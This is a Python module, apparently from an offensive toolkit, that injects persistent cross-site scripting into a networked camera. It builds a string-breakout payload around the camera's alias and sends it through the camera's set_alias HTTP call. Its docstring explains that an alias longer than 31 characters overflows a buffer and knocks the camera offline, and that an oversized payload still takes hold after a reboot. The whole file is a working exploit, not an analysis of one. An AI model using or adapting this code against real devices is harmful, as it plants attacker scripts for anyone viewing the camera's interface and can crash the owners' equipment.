from ..interfaces.http import methods as http_methods
from ..interfaces.http import parameters as http_params
from .. import decorators
import logging

"""
Imports:
    ..interfaces.http.methods as http_methods
    ..interfaces.http.parameters as http_params
    ..decorators
    logging

Contains:
    xss_inject
    _get_current_alias

Constants defined here:
    MAX_PAYLOAD_LEN
"""

logger = logging.getLogger(__name__)
logger.info(f'Library imported: {__name__}')

MAX_PAYLOAD_LEN = 31

@decorators.debug()
def xss_inject(http, javascript, _new_alias=''):
    """
    Injects persistent Cross-Site-Scripting javascript

    Reference: https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)

    :param http - A <Http> instance
    :param javascript - The javascript to inject
    :param _new_alias - The new alias to give the camera
        ... Set this to None to keep the old one

    Note: By buffer-overflowing the cameras alias, it will knock
    ... the camera offline

    len(inject) == 31 => Safe
    len(inject) >  31 => Crashes

    Therefore, will check len(inject) <= 31

    Note: After a reboot a payload that caused the camera to crash
    ... will have been successfully embeded. Therefore if a lengthy
    ... payload is required, it may still be able to be injected,
    ... but only following a reboot.
    """

    javascript = javascript.strip()

    if javascript.endswith(';'):
        javascript = javascript[:-1]

    if _new_alias is None:
        alias = _get_current_alias(http)
    else:
        alias = _new_alias

    payload = f'{alias}";{javascript};var _="'

    if len(payload) > MAX_PAYLOAD_LEN:
        logger.debug('Payload too long, would crash camera')

        return

    logger.debug(f'Injecting: {payload}')

    parameters = \
    {
        http_params.ALIAS: payload,
    }

    resp = http_methods.set_alias \
    (
        get_parameters = parameters,
        http = http,
    )

    result = resp.get(http_params.RESULT)

    success = result == 'ok'

    if not success:
        logger.debug \
        (
            'http.set_alias did not return result="ok", '
            'injection failed'
        )

    return success

@decorators.debug()
def _get_current_alias(http):
    """
    Gets the cameras current alias
    """

    resp = http_methods.get_status(http=http)

    alias = resp.get(http_params.ALIAS)

    logger.debug(f'Found alias: {alias}')

    return alias
